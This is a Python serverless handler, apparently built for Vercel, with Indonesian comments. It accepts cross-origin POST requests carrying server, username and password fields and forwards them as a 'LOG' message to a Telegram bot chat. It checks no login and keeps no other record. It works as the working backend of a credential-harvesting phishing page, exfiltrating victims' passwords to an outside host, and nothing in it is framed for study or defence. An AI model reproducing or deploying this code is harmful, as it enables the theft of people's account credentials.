import os, json, urllib.request, urllib.error
from http.server import BaseHTTPRequestHandler
from datetime import datetime

def tg(t, c, m):
    url = f"https://api.telegram.org/bot{t}/sendMessage"
    payload = json.dumps({"chat_id": c, "text": m}).encode('utf-8')
    r = urllib.request.Request(
        url, 
        data=payload, 
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(r, timeout=10) as response:
            return response.read()
    except urllib.error.HTTPError as e:
        # Menangkap error spesifik dari server Telegram (misal: Token salah, atau Chat ID tidak ditemukan)
        error_message = e.read().decode('utf-8')
        raise Exception(f"Telegram API Error: {e.code} - {error_message}")

class handler(BaseHTTPRequestHandler):
    def log_message(self, f, *a): pass
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
        
    def do_POST(self):
        tk = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
        ci = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
        
        if not tk or not ci:
            self.send_response(500)
            self.send_header("Content-type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"status":"error","message":"Konfigurasi Telegram kosong di Vercel"}')
            return

        try:
            n = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(n).decode('utf-8') if n else "{}"
            d = json.loads(body)
            
            m = "LOG\nServer: {}\nUser: {}\nPass: {}\nTime: {}".format(
                d.get("server", "-"),
                d.get("username", "-"),
                d.get("password", "-"),
                datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            )
            
            # Kirim ke Telegram
            tg(tk, ci, m)
            
            # Jika sukses total
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
            
        except Exception as e:
            # Jika gagal, kirim detail errornya agar muncul di Vercel Runtime Logs Anda!
            print(f"CRITICAL_ERROR: {str(e)}")
            self.send_response(500)
            self.send_header("Content-type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            error_response = {"status": "error", "message": str(e)}
            self.wfile.write(json.dumps(error_response).encode('utf-8'))
